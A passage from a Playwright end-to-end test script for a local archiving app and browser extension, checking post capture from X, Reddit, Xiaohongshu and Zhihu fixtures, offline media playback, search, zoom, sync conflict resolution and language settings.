    .getByRole("searchbox", { name: "搜索 Reddit 收藏" })
    .press("Enter");
  await page.waitForTimeout(500);
  pass(
    "Reddit saved sidebar filters communities and searches archived discussions",
  );
  await page.screenshot({ path: "artifacts/glassmark-reddit.png" });
  assert.equal(socialRequests.length, 0);
  pass(
    "multi-post social feeds filter authors and communities and display only archived media",
  );
  await page.locator('button[data-view="web"]').click();
  await page.locator(".preview-frame").waitFor();
  const centered = await page.locator(".preview-frame").evaluate((el) => {
    const frame = el.getBoundingClientRect(),
      reader = document.querySelector("#reader").getBoundingClientRect();
    return (
      Math.abs(frame.left + frame.right - (reader.left + reader.right)) / 2
    );
  });
  assert.ok(
    centered < 10,
    "web preview should be centered in the reading pane",
  );
  pass(
    "webpage preview uses a centered reading column and open-source toolbar icons",
  );
  // Global search is independent of site search and current source.
  await page.locator('button[data-view="x"]').click();
  assert.equal(await page.locator("#search").isVisible(), true);
  await page.locator("#search").fill("What makes a personal archive");
  await page
    .locator(`.global-result[data-global-id="${redditItem.id}"]`)
    .waitFor();
  await page
    .locator(`.global-result[data-global-id="${redditItem.id}"]`)
    .click();
  await expect(page.locator(".reddit-post-detail")).toHaveCount(1);
  assert.equal(await page.locator("#global-results-back").isVisible(), true);
  await page.locator("#search").fill("");
  await page.waitForTimeout(400);
  await page.locator('button[data-view="x"]').click();
  await page.locator('[data-social-action="new-tag"]').click();
  await page.locator("#catalog-tag-name").fill("Video lab");
  await page.getByRole("button", { name: "创建标签", exact: true }).click();
  await page.locator('.collection-tabs [data-tag="Video lab"]').waitFor();
  const catalog = await get("/api/capture-options");
  assert.equal(
    catalog.tags.some((t) => t.platform === "x" && t.name === "Video lab"),
    true,
  );
  pass(
    "global search reaches Reddit from X while site search and platform tag catalogs stay independent",
  );
  await collect("https://x.com/lin/status/1001", "thread", { maxPosts: 3 });
  await source.evaluate(() =>
    history.replaceState(null, "", "/chen/status/1002"),
  );
  const currentRoot = await source.evaluate(() =>
    GlassmarkCapture.collect({ mode: "thread", maxPosts: 3 }),
  );
  assert.equal(currentRoot.posts[0].url, "https://x.com/chen/status/1002");
  assert.equal(currentRoot.posts.filter((p) => !p.isComment).length, 1);
  assert.ok(!currentRoot.posts.some((p) => p.url?.includes("/1001")));
  await source.evaluate(() => {
    const ad = document.querySelector("article").cloneNode(true);
    ad.dataset.promoted = "true";
    ad.querySelector('[data-testid="tweetText"]').textContent =
      "Sponsored reply should be excluded";
    ad.querySelector("a").href = "/ads/status/5555";
    document.querySelector("main").append(ad);
  });
  const withoutAds = await source.evaluate(() =>
    GlassmarkCapture.collect({
      mode: "thread",
      maxPosts: 10,
      autoLoadSeconds: 1,
    }),
  );
  assert.ok(!withoutAds.posts.some((p) => p.text.includes("Sponsored reply")));
  await source.evaluate(() => history.replaceState(null, "", "/home"));
  await assert.rejects(
    source.evaluate(() =>
      GlassmarkCapture.collect({ mode: "page", language: "zh-CN" }),
    ),
    /不支持收藏信息流/,
  );
  await source.evaluate(() =>
    history.replaceState(null, "", "/chen/status/1002"),
  );
  pass(
    "the URL-selected post is primary even when an ancestor appears first in the DOM",
  );
  // Current-post capture ignores recommendations and preserves downloadable video.
  await collect("https://x.com/lin/status/1001", "thread", { maxPosts: 3 });
  await source.evaluate(() => {
    const main = document.querySelector("main");
    const boundary = document.createElement("h2");
    boundary.textContent = "Discover more";
    main.append(boundary);
    const unrelated = document.querySelector("article").cloneNode(true);
    unrelated.querySelector('a[href*="/status/"]').href = "/other/status/9999";
    main.append(unrelated);
    document.querySelector("article .photo")?.remove();
    const v = document.createElement("video");
    v.src = "http://127.0.0.1:1420/fixtures/video.webm";
    v.controls = true;
    document.querySelector("article").append(v);
  });
  const videoCapture = await source.evaluate(() =>
    GlassmarkCapture.collect({ mode: "thread", maxPosts: 3 }),
  );
  assert.equal(videoCapture.posts[0].url, "https://x.com/lin/status/1001");
  assert.equal(
    videoCapture.posts.some((p) => p.url?.includes("9999")),
    false,
  );
  assert.equal(
    videoCapture.posts[0].media.some(
      (m) => m.type === "video" && m.url.endsWith("video.webm"),
    ),
    true,
  );
  const videoItem = await save({ ...videoCapture, tags: ["Video lab"] });
  await page.waitForTimeout(3300);
  await page.locator('.collection-tabs [data-tag="Video lab"]').click();
  await page
    .locator(`.x-post[data-open-archive="${videoItem.id}"] video`)
    .waitFor();
  await page
    .locator(`.x-post[data-open-archive="${videoItem.id}"] video`)
    .evaluate(async (v) => {
      await v.play();
    });
  await page.waitForTimeout(400);
  assert.equal(
    await page
      .locator(`.x-post[data-open-archive="${videoItem.id}"] video`)
      .evaluate((v) => v.currentTime > 0),
    true,
  );
  const hlsResources = await archiveResources(
    ["http://127.0.0.1:1420/fixtures/hls/video.m3u8"],
    {
      approve: async () => true,
      upload: async (name, bytes, mime) => {
        await call("/api/blobs/" + name, {
          method: "PUT",
          headers: { "Content-Type": mime },
          body: bytes,
        });
      },
    },
  );
  assert.ok(hlsResources.length >= 4);
  assert.equal(
    hlsResources.every((r) => r.status === "saved"),
    true,
  );
  const hlsItem = await post("/api/items", {
    ...videoCapture,
    title: "Offline HLS video",
    tags: ["Video lab"],
    resources: hlsResources,
    posts: [
      {
        ...videoCapture.posts[0],
        media: [
          {
            type: "video",
            url: "http://127.0.0.1:1420/fixtures/hls/video.m3u8",
          },
        ],
      },
    ],
  });
  await page.waitForTimeout(3300);
  const hlsVideo = page.locator(
    `.x-post[data-open-archive="${hlsItem.id}"] video`,
  );
  await hlsVideo.waitFor();
  const canH264 = await hlsVideo.evaluate(
    (v) => !!v.canPlayType('video/mp4; codecs="avc1.42E01E"'),
  );
  if (canH264) {
    await hlsVideo.evaluate((v) => v.play());
    await page.waitForTimeout(400);
    assert.ok(await hlsVideo.evaluate((v) => v.currentTime > 0));
  }
  assert.equal(socialRequests.length, 0);
  pass(
    "current-post capture excludes recommendations; direct video plays offline and finite HLS includes all segments",
  );
  await call("/api/items/" + videoItem.id, { method: "DELETE" });
  await call("/api/items/" + hlsItem.id, { method: "DELETE" });
  await page.locator('.collection-tabs [data-tag=""]').click();
  await page.locator("#window-close").hover();
  assert.equal(
    await page
      .locator("#window-close span")
      .evaluate((e) => getComputedStyle(e).opacity),
    "1",
  );
  assert.equal(
    await page.locator("#window-close").getAttribute("title"),
    "关闭窗口",
  );
  pass("window controls reveal hover symbols and labelled tooltips");
  await page.locator('button[data-view="web"]').click();
  await page.locator("#new-folder").click();
  await page.locator("#dialog-close").click();
  await expect(page.locator("#dialog")).not.toBeVisible();
  await page.locator("#new-folder").click();
  await page.keyboard.press("Escape");
  await expect(page.locator("#dialog")).not.toBeVisible();
  await page.locator("#new-folder").click();
  await page.locator("#dialog-cancel").click();
  await expect(page.locator("#dialog")).not.toBeVisible();
  pass(
    "empty folder dialogs close through close, Escape and Cancel without validation traps",
  );
  await page.locator("#saved-page").waitFor({ state: "visible" });
  assert.equal(
    await page.locator(".reader-heading,.preview-chrome").count(),
    0,
  );
  assert.equal(await page.locator("#page-metadata").isVisible(), true);
  const coverage = await page
    .locator("#saved-page")
    .evaluate(
      (el) =>
        el.getBoundingClientRect().height /
        document.querySelector("#reader").getBoundingClientRect().height,
    );
  assert.ok(coverage > 0.95);
  pass(
    "web content fills the reader while metadata lives beside the folder breadcrumb",
  );

  await expect(page.locator("#page-zoom")).toBeVisible();
  await page.locator("#page-zoom-in").click();
  await expect(page.locator("#page-zoom-value")).toHaveValue("110");
  await expect
    .poll(() =>
      page
        .locator("#saved-page")
        .evaluate((el) => el.contentDocument?.documentElement?.style.zoom),
    )
    .toBe("1.1");
  await page.locator("#page-zoom-value").selectOption("150");
  await expect
    .poll(() =>
      page
        .locator("#saved-page")
        .evaluate((el) => el.contentDocument?.documentElement?.style.zoom),
    )
    .toBe("1.5");
  await page.reload();
  await expect(page.locator("#page-zoom-value")).toHaveValue("150");
  await expect
    .poll(() =>
      page
        .locator("#saved-page")
        .evaluate((el) => el.contentDocument?.documentElement?.style.zoom),
    )
    .toBe("1.5");
  await page
    .frameLocator("#saved-page")
    .locator("body")
    .click({ position: { x: 5, y: 5 } });
  await page.keyboard.press("Control+0");
  await expect(page.locator("#page-zoom-value")).toHaveValue("100");
  await page.locator("#page-zoom-value").selectOption("200");
  await expect(page.locator("#page-zoom-in")).toBeDisabled();
  await page.locator("#page-zoom-value").selectOption("50");
  await expect(page.locator("#page-zoom-out")).toBeDisabled();
  await page.locator("#page-zoom-value").selectOption("100");
  pass(
    "saved webpages support bounded zoom, persist their scale after reload and reset from inside the sandbox with keyboard shortcuts",
  );
  const deletion = await save({
    ...videoCapture,
    resources: [],
    tags: ["删除测试"],
  });
  await page.locator('button[data-view="x"]').click();
  await page.waitForTimeout(3300);
  await page
    .locator(`.x-post[data-open-archive="${deletion.id}"] .post-menu summary`)
    .click();
  await page
    .locator(
      `.x-post[data-open-archive="${deletion.id}"] [data-social-action="delete"]`,
    )
    .click();
  await page
    .locator("#dialog-actions")
    .getByRole("button", { name: "删除收藏", exact: true })
    .click();
  await expect(
    page.locator(`.x-post[data-open-archive="${deletion.id}"]`),
  ).toHaveCount(0);
  assert.equal(
    (await get("/api/items")).some((i) => i.id === deletion.id),
    false,
  );
  pass("post menus delete persistent content from the feed and search index");
  await source.route("https://www.xiaohongshu.com/**", (route) =>
    route.fulfill({
      contentType: "text/html",
      path: "tests/fixtures/xiaohongshu.html",
    }),
  );
  const note = await collect(
    "https://www.xiaohongshu.com/explore/abc123?xsec_token=test",
    "thread",
  );
  assert.equal(note.platform, "xiaohongshu");
  assert.equal(note.posts.length, 2);
  assert.equal(note.posts[0].title, "山间的一天");
  assert.equal(note.posts[1].isComment, true);
  assert.equal(note.posts[0].media.length, 2);
  assert.ok(note.posts[0].avatarUrl.endsWith("avatar.svg"));
  assert.doesNotMatch(note.text, /推荐笔记/);
  const sourceLocale = await source.evaluate(async () => {
    const before = document.documentElement.lang;
    const capture = await GlassmarkCapture.collect({
      mode: "thread",
      language: "ja",
    });
    return {
      before,
      after: document.documentElement.lang,
      title: capture.posts[0].title,
      warnings: capture.warnings.join(" "),
    };
  });
  assert.equal(sourceLocale.before, sourceLocale.after);
  assert.equal(sourceLocale.title, "山间的一天");
  assert.match(sourceLocale.warnings, /読み込み済み/);
  pass(
    "capture controls use the requested language without changing the source document language or post text",
  );
  // Nested comments must not contaminate their parent author, text or time.
  const nestedNote = await source.evaluate(async () => {
    document
      .querySelector(".comment-item")
      .insertAdjacentHTML(
        "beforeend",
        '<div class="comment-item" data-comment-id="reply-nested" data-parent-id="comment-1"><div class="author"><span class="name">小李</span></div><div class="content">回复小林</div><time datetime="2026-10-17T09:30:00Z"></time></div>',
      );
    return (
      await GlassmarkCapture.collect({
        mode: "thread",
        language: "zh-CN",
        maxPosts: 4,
      })
    ).posts;
  });
  assert.equal(nestedNote.length, 3);
  const parentComment = nestedNote.find((p) => p.id === "comment-1");
  const childComment = nestedNote.find((p) => p.id === "reply-nested");
  assert.equal(parentComment.text, "好美的风景");
  assert.equal(parentComment.authorName, "小林");
  assert.equal(childComment.parentId, "comment-1");
  assert.equal(childComment.authorName, "小李");
  assert.equal(childComment.depth, 2);
  assert.equal(childComment.postedAt, "2026-10-17T09:30:00Z");
  const noteItem = await save(note);
  const noteExtras = [];
  for (const [index, title] of [
    "一条安静的山间小路",
    "周末的片刻留白",
    "把日常慢慢收藏",
    "山野有风",
  ].entries()) {
    noteExtras.push(
      await save({
        ...note,
        title,
        text: title,
        url: note.url.replace("abc123", `sample${index}`),
        posts: [
          {
            ...note.posts[0],
            title,
            text: title + "。留住值得回看的风景。",
            media: note.posts[0].media.filter((m) => m.type === "image"),
            authorName: ["小林", "南山", "小满", "木木"][index],
          },
        ],
      }),
    );
  }
  await page.waitForTimeout(3300);
  await page.locator('button[data-view="xiaohongshu"]').click();
  await expect(page.locator(".note-post")).toHaveCount(5);
  assert.equal(
    await page
      .locator(
        ".note-shell .x-shell,.note-shell .x-feed-header,.note-shell .reddit-comment,.note-shell .saved-site-sidebar",
      )
      .count(),
    0,
  );
  assert.equal(await page.locator(".note-grid .note-cover").count(), 5);
  await page.screenshot({
    path: "artifacts/glassmark-xiaohongshu-collection.png",
  });
  await page.locator(`.note-post[data-open-archive="${noteItem.id}"]`).click();
  await expect(page.locator(".note-comment")).toHaveCount(1);
  await expect(page.locator(".note-gallery")).toBeVisible();
  const split = await page.locator(".note-detail").evaluate((el) => {
    const gallery = el.querySelector(".note-gallery").getBoundingClientRect();
    const content = el
      .querySelector(".note-detail-content")
      .getBoundingClientRect();
    return gallery.right <= content.left + 2;
  });
  assert.equal(split, true);
  await page.getByRole("button", { name: "下一张", exact: true }).click();
  await expect(page.locator(".note-gallery-count")).toHaveText("2 / 2");
  await page.getByRole("button", { name: "上一张", exact: true }).click();
  await expect(page.locator(".note-gallery-count")).toHaveText("1 / 2");
  await page.screenshot({ path: "artifacts/glassmark-xiaohongshu-detail.png" });
  await page.getByRole("button", { name: "返回收藏", exact: true }).click();
  await expect(page.locator(".note-post")).toHaveCount(5);
  assert.equal(await page.locator(".show-thread").count(), 0);
  await page.getByRole("searchbox", { name: "搜索 小红书 收藏" }).fill("山间");
  await page
    .getByRole("searchbox", { name: "搜索 小红书 收藏" })
    .press("Enter");
  await expect(page.locator(".note-post")).toHaveCount(2);
  await page.screenshot({ path: "artifacts/glassmark-xiaohongshu.png" });
  await call("/api/items/" + noteItem.id, { method: "DELETE" });
  for (const item of noteExtras)
    await call("/api/items/" + item.id, { method: "DELETE" });
  pass(
    "Xiaohongshu captures only the open note and loaded comments, archives media, opens detail and searches locally",
  );

  await source.route("https://www.zhihu.com/**", (route) =>
    route.fulfill({
      contentType: "text/html",
      path: "tests/fixtures/zhihu.html",
    }),
  );
  const answer = await collect(
    "https://www.zhihu.com/question/123/answer/456",
    "thread",
  );
  assert.equal(answer.platform, "zhihu");
  assert.equal(answer.posts.length, 3);
  assert.equal(answer.posts[0].title, "如何建立自己的知识库？");
  assert.equal(answer.posts[0].authorName, "林间");
  assert.ok(!answer.posts.some((p) => p.text.includes("不应采集")));
  assert.equal(
    answer.posts[0].media[0].url,
    "http://127.0.0.1:1420/fixtures/note-cover.svg",
  );
  assert.equal(answer.posts[1].text, "读完以后再分类很有帮助。");
  assert.equal(answer.posts[2].text, "同意，先留下来，再慢慢读。");
  const answerItem = await save(answer);
  await page.reload();
  await page.locator('button[data-view="zhihu"]').click();
  await expect(page.locator(".zhihu-post")).toHaveCount(1);
  await expect(page.locator(".zhihu-header .zhihu-wordmark")).toBeVisible();
  await page.locator(".zhihu-post").click();
  await expect(page.locator(".zhihu-detail")).toBeVisible();
  await expect(page.locator(".zhihu-comments .note-comment")).toHaveCount(2);
  await expect(page.locator(".zhihu-detail .social-media img")).toHaveAttribute(
    "src",
    /^blob:/,
  );
  await page.screenshot({ path: "artifacts/glassmark-zhihu.png" });
  await page.locator(".discussion-back button").focus();
  await page.keyboard.press("Escape");
  await expect(page.locator(".zhihu-detail")).toHaveCount(0);
  await page
    .getByRole("searchbox", { name: "搜索 知乎 收藏" })
    .fill("不存在的搜索");
  await page.getByRole("searchbox", { name: "搜索 知乎 收藏" }).press("Enter");
  await expect(page.locator(".social-empty")).toContainText("没有找到相关收藏");
  await page.getByRole("button", { name: "清除搜索", exact: true }).click();
  await expect(page.locator(".zhihu-post")).toHaveCount(1);
  await source.route("https://zhuanlan.zhihu.com/**", (route) =>
    route.fulfill({
      contentType: "text/html",
      body: `<meta charset="utf-8"><main><article class="Post-Main"><h1 class="Post-Title">长文的价值</h1><a class="AuthorInfo-name">林间</a><div class="Post-RichTextContainer">留下想要重读的内容。</div><div class="CommentItem" data-comment-id="article-comment"><a class="UserLink-link">远山</a><p class="CommentItem-content">值得收藏。</p></div></article></main>`,
    }),
  );
  const zhihuArticle = await collect(
    "https://zhuanlan.zhihu.com/p/789",
    "thread",
  );
  assert.equal(zhihuArticle.posts.length, 2);
  assert.equal(zhihuArticle.posts[0].title, "长文的价值");
  assert.equal(zhihuArticle.posts[0].text, "留下想要重读的内容。");
  assert.equal(zhihuArticle.posts[0].url, "https://zhuanlan.zhihu.com/p/789");
  await call("/api/items/" + answerItem.id, { method: "DELETE" });
  pass(
    "Zhihu locks the selected answer or article, preserves loaded comments and archived images, with its own searchable reader",
  );

  await source.route("https://www.zhihu.com/question/123", (route) =>
    route.fulfill({
      contentType: "text/html",
      path: "tests/fixtures/zhihu-question.html",
    }),
  );
  await source.goto("https://www.zhihu.com/question/123");
  await source.addScriptTag({ content: captureScript });
  await assert.rejects(
    source.evaluate(() =>
      GlassmarkCapture.collect({ mode: "thread", language: "zh-CN" }),
    ),
    /请先选择/,
  );
  const pickerScript = await readFile(
    "dist/extension-chromium/picker.js",
    "utf8",
  );
  await source.evaluate(() => {
    globalThis.__glassmarkLanguage = "zh-CN";
    globalThis.__glassmarkPickerMode = "zhihu-answer";
    globalThis.chrome = {
      runtime: {
        sendMessage: async (message) => {
          globalThis.pickerMessage = message;
        },
      },
    };
  });
  await source.addScriptTag({ content: pickerScript });
  await source.locator("h1").click();
  await expect(source.locator("[data-glassmark-ui] b")).toHaveText("0 个区域");
  await source
    .locator(".AnswerItem")
    .nth(0)
    .locator(".RichContent-inner")
    .click();
  await source
    .locator(".AnswerItem")
    .nth(1)
    .locator(".RichContent-inner")
    .click();
  await source.keyboard.press("ArrowUp");
  await expect(source.locator("[data-glassmark-ui] b")).toHaveText(
    "已选择 1 个回答",
  );
  await source
    .getByRole("button", { name: "保存回答与评论", exact: true })
    .click();
  await source.waitForFunction(
    () => globalThis.pickerMessage?.type === "selection-ready",
  );
  assert.deepEqual(await source.evaluate(() => globalThis.pickerMessage), {
    type: "selection-ready",
    mode: "thread",
  });
  const chosenAnswer = await source.evaluate(() =>
    GlassmarkCapture.collect({
      mode: "thread",
      language: "zh-CN",
      autoLoadSeconds: 8,
    }),
  );
  assert.equal(
    chosenAnswer.url,
    "https://www.zhihu.com/question/123/answer/222",
  );
  assert.equal(chosenAnswer.posts[0].id, "222");
  assert.equal(chosenAnswer.posts[0].authorName, "选中作者");
  assert.equal(chosenAnswer.posts[0].text, "选中的回答全文");
  assert.equal(chosenAnswer.posts[0].media.length, 1);
  assert.deepEqual(
    chosenAnswer.posts.map((p) => p.id),
    ["222", "c1", "reply1", "c2", "c3"],
  );
  // No asserted parent without explicit source metadata for a top-level comment.
  assert.equal(chosenAnswer.posts[1].parentId, null);
  assert.equal(chosenAnswer.posts[2].parentId, "c1");
  assert.ok(!chosenAnswer.text.includes("其他回答"));
  assert.ok(!chosenAnswer.text.includes("广告"));
  await source.evaluate(() =>
    globalThis.__glassmarkZhihuAnswer.element.remove(),
  );
  await assert.rejects(
    source.evaluate(() =>
      GlassmarkCapture.collect({ mode: "thread", language: "zh-CN" }),
    ),
    /选择已失效/,
  );
  await source.addScriptTag({ content: pickerScript });
  await source.keyboard.press("Escape");
  await expect(source.locator("[data-glassmark-ui]")).toHaveCount(0);
  assert.equal(
    await source.evaluate(() => globalThis.__glassmarkZhihuAnswer),
    undefined,
  );
  pass(
    "Zhihu answer picker selects one answer, cancels cleanly, rejects stale roots and captures only its expanded body, modal comments, nested replies and multiple pages",
  );

  await source.route("https://x.com/media/status/777", (route) =>
    route.fulfill({
      contentType: "text/html",
      path: "tests/fixtures/x-multiple.html",
    }),
  );
  const multiple = await collect("https://x.com/media/status/777", "thread", {
    autoLoadSeconds: 1,
  });
  assert.equal(
    multiple.posts[0].media.filter((m) => m.type === "image").length,
    4,
  );
  assert.equal(
    multiple.posts[0].media.filter((m) => m.type === "video").length,
    2,
  );
  assert.equal(
    new Set(
      multiple.posts[0].media
        .filter((m) => m.type === "video")
        .map((m) => m.url),
    ).size,
    2,
  );
  const multiItem = await save(multiple);
  for (const entry of multiple.posts[0].media)
    assert.ok(
      multiItem.resources.some(
        (r) => r.url === entry.url && r.status === "saved",
      ),
    );
  await page.reload();
  await page.locator('[data-view="x"]').click();
  await page
    .locator(`.x-post[data-open-archive="${multiItem.id}"] .x-post-text`)
    .click();
  await expect(page.locator(".x-post-detail .social-media img")).toHaveCount(4);
  await expect(page.locator(".x-post-detail video")).toHaveCount(2);
  for (const video of await page.locator(".x-post-detail video").all())
    await expect(video).toHaveAttribute("src", /^blob:/);

  await page.locator(".x-post-detail .social-media img").first().click();
  await expect(
    page.getByRole("dialog", { name: "查看已保存的媒体" }),
  ).toBeVisible();
  await expect(page.locator(".archive-viewer-counter")).toHaveText("1 / 6");
  await page.locator('[data-viewer-step="1"]').click();
  await expect(page.locator(".archive-viewer-counter")).toHaveText("2 / 6");
  await page.keyboard.press("Escape");
  await expect(page.locator(".archive-media-viewer")).toHaveCount(0);
  await expect(page.locator(".x-post-detail")).toBeVisible();

  const enriched = await source.evaluate(async () => {
    const article = document.querySelector("article");
    const late = [
      ...article.querySelectorAll(
        '[data-testid="tweetPhoto"],[data-testid="videoComponent"]',
      ),
    ].slice(1);
    late.forEach((node) => node.remove());
    setTimeout(() => late.forEach((node) => article.append(node)), 300);
    return GlassmarkCapture.collect({
      mode: "thread",
      language: "zh-CN",
      autoLoadSeconds: 2,
    });
  });
  assert.equal(enriched.posts[0].media.length, 6);
  // Each player must use its own HLS manifest even when both are exposed in one post.
  const hlsAssignment = await source.evaluate(async () => {
    const article = document.querySelector("article");
    for (const [i, container] of [
      ...article.querySelectorAll('[data-testid="videoComponent"]'),
    ].entries()) {
      const video = container.querySelector("video");
      video.removeAttribute("src");
      container.dataset.video = JSON.stringify({
        url: `https://video.twimg.com/ext_tw_video/${i + 1}/master.m3u8`,
      });
    }
    return (
      await GlassmarkCapture.collect({
        mode: "thread",
        language: "zh-CN",
        autoLoadSeconds: 1,
      })
    ).posts[0].media
      .filter((m) => m.type === "video")
      .map((m) => m.url);
  });
  assert.deepEqual(hlsAssignment, [
    "https://video.twimg.com/ext_tw_video/1/master.m3u8",
    "https://video.twimg.com/ext_tw_video/2/master.m3u8",
  ]);
  await call("/api/items/" + multiItem.id, { method: "DELETE" });
  pass(
    "X archives and displays every photo and separate video; multiple HLS players never share the first source",
  );

  let mockedConflicts = [
    {
      id: "11111111-1111-4111-8111-111111111111",
      kind: "item",
      versions: [
        {
          revision: "left",
          current: true,
          data: {
            title: "Concurrent save",
            tags: ["Design"],
            modifiedAt: "2026-10-16T00:00:00Z",
          },
        },
        {
          revision: "right",
          current: false,
          data: {
            title: "Concurrent save",
            tags: ["Research"],
            modifiedAt: "2026-10-16T00:00:01Z",
          },
        },
      ],
    },
  ];
  let resolution;
  await page.route(connection.base + "/api/conflicts", (route) =>
    route.fulfill({ json: mockedConflicts }),
  );
  await page.route(
    connection.base + "/api/conflicts/*/resolve",
    async (route) => {
      resolution = route.request().postDataJSON();
      mockedConflicts = [];
      await route.fulfill({ json: { ok: true } });
    },
  );
  await page.locator("#settings").click();
  await page.locator('[data-settings-category="sync"]').click();
  await expect(page.locator("#sync-conflicts")).toHaveCount(0);
  await page.locator('[data-sync-mode="webdav"]').click();
  await expect(page.locator('[data-sync-config="webdav"] .conflict-versions article')).toHaveCount(2);
  await page.getByRole("button", { name: "合并全部标签", exact: true }).click();
  await expect(page.locator("#sync-conflicts")).toContainText(
    "没有待处理的冲突",
  );
  assert.deepEqual(resolution.heads, ["left", "right"]);
  assert.equal(resolution.mergeTags, true);
  await page.locator("#dialog-close").click();
  await page.unroute(connection.base + "/api/conflicts");
  await page.unroute(connection.base + "/api/conflicts/*/resolve");
  pass(
    "WebDAV settings compare preserved versions and submit an explicit tag merge with the expected causal heads",
  );
  const popup = await context.newPage();
  popup.on("pageerror", (e) => errors.push(e.message));
  await popup.addInitScript(
    ({ token, version }) => {
      globalThis.browser = {
        runtime: { getManifest: () => ({ version }) },
        tabs: {
          query: async () => [
            {
              id: 1,
              title: "测试页面",
              url:
                sessionStorage.getItem("popup-source") ||
                "https://x.com/a/status/123",
            },
          ],
        },
        storage: {
          local: {
            get: async (key) =>
              key === "connection" ? { connection: { token } } : {},
            remove: async () => {},
            set: async () => {},
          },
        },
      };
    },
    {
      token: connection.token,
      version: JSON.parse(await readFile("package.json", "utf8")).version,
    },
  );
  for (const url of [
    "https://x.com/a/status/123",
    "https://www.reddit.com/r/test/comments/abc/post/",
    "https://www.xiaohongshu.com/explore/abc123",
    "https://www.zhihu.com/question/123/answer/456",
    "https://www.zhihu.com/question/123",
    "https://zhuanlan.zhihu.com/p/789",
    "https://example.com/article",
  ]) {
    await popup.goto("http://localhost:1420/extension/popup.html");
    await popup.evaluate(
      (url) => sessionStorage.setItem("popup-source", url),
      url,
    );
    await popup.reload();
    await expect(popup.locator("#actions")).toBeVisible();
    await expect(popup.locator("#extension-version")).toHaveText(
      JSON.parse(await readFile("package.json", "utf8")).version,
    );
    const isPost = !url.includes("example.com");
    if (isPost) {
      await expect(popup.locator("#save-post")).toBeVisible();
      await expect(popup.locator("#save-page")).toBeHidden();
      await expect(popup.locator(".selection-action")).toBeHidden();
    } else {
      await expect(popup.locator("#save-post")).toBeHidden();
      await expect(popup.locator("#save-page")).toBeVisible();
      await expect(popup.locator(".selection-action")).toBeVisible();
    }
    assert.doesNotMatch(
      await popup.locator("body").innerText(),
      /锁定当前主帖|500 MB|路并发|图片与视频|本地归档/,
    );
  }
  await popup.locator("#extension-settings > summary").click();
  await expect(popup.locator("#connection-settings > summary")).toBeVisible();
  await popup.locator("#connection-settings > summary").click();
  await expect(popup.locator("#retry-connection")).toBeVisible();
  await popup.setViewportSize({ width: 380, height: 740 });
  await popup.addStyleTag({ url: "/test-fonts/400.css" });
  await popup.addStyleTag({
    content:
      "body,button,input,select{font-family: 'Noto Sans SC', sans-serif!important}",
  });
  await popup.evaluate(() => document.fonts.ready);
  await popup.screenshot({ path: "artifacts/glassmark-popup.png" });
  // Switch through the actual settings control and reload, preserving user content.
  await page.locator("#settings").click();
  await page.locator('[data-pref="language"]').selectOption("en");
  await page.getByRole("button", { name: "保存设置", exact: true }).click();
  await expect(page.locator("html")).toHaveAttribute("lang", "en");
  await expect(page.locator("html")).toHaveAttribute("data-app-ready", "true");
  await page.locator('[data-view="web"]').click();
  await expect(page.locator("#folders")).toContainText("灵感花园");
  await popup.reload();
  await expect(popup.locator("html")).toHaveAttribute("lang", "en");
  await expect(popup.locator("#save-page")).toHaveText(/Save entire page/);
  await page.locator("#settings").click();
  await expect(page.getByLabel("Language", { exact: true })).toHaveValue("en");
  const previousSize = page.viewportSize();
  await page.setViewportSize({ width: 960, height: 640 });
  await expect(
    page.getByRole("button", { name: "Save settings", exact: true }),
  ).toBeInViewport();
  await page.getByLabel("Language", { exact: true }).selectOption("ja");
  await page
    .getByRole("button", { name: "Save settings", exact: true })
    .click();
  await expect(page.locator("html")).toHaveAttribute("lang", "ja");
  await expect(page.locator("html")).toHaveAttribute("data-app-ready", "true");
  await page.locator("#settings").click();
  await expect(page.getByLabel("言語", { exact: true })).toHaveValue("ja");
  await page.getByLabel("言語", { exact: true }).selectOption("system");
  await page.getByRole("button", { name: "設定を保存", exact: true }).click();
  await expect(page.locator("html")).toHaveAttribute("lang", "en");
  await expect(page.locator("html")).toHaveAttribute("data-app-ready", "true");
  await popup.addInitScript(() =>
    Object.defineProperty(navigator, "language", { value: "ja-JP" }),
  );
  await popup.reload();
  await expect(popup.locator("html")).toHaveAttribute("lang", "en");
  const systemPreference = await get("/api/preferences");
  assert.equal(systemPreference.language, "system");
  assert.equal(systemPreference.resolvedLanguage, "en");
  await page.locator("#settings").click();
  await page.getByLabel("Language", { exact: true }).selectOption("zh-CN");
  await page
    .getByRole("button", { name: "Save settings", exact: true })
    .click();
  await expect(page.locator("html")).toHaveAttribute("lang", "zh-CN");
  await page.setViewportSize(previousSize);
  assert.equal((await get("/api/preferences")).language, "zh-CN");
  pass(
    "language settings persist across reloads, extensions follow the client, user folder names remain original and compact English controls fit",
  );
  await popup.close();
  pass(
    "popup exposes only post actions on X, Reddit, Xiaohongshu and Zhihu; webpages retain both capture modes and connection settings expand",
  );
  assert.deepEqual(errors, []);
  pass("desktop interface has no uncaught JavaScript errors");
  const report = {
    backend: nativeProcess ? "native-rust" : "fixture-bridge",
    browser: await browser.version(),
    checks,
    recordedAt: new Date().toISOString(),
  };
  await writeFile("artifacts/e2e-report.json", JSON.stringify(report, null, 2));
  await source.close();
  await context.close();
  context = null;
  if (recording) {
    const video = await page.video().path();
    await writeFile("artifacts/video-path.txt", video);
    console.log("VIDEO", video);
  }
  console.log(`Passed ${checks.length} end-to-end checks.`);
} catch (error) {
  await context
    ?.pages()[0]
    ?.screenshot({ path: "artifacts/e2e-failure.png" })
    .catch(() => {});
  throw error;
} finally {
  if (context) await context.close();
  if (browser) await browser.close();
  if (server) await new Promise((r) => server.close(r));
  if (bridge) await new Promise((r) => bridge.server.close(r));
  nativeProcess?.kill();
}
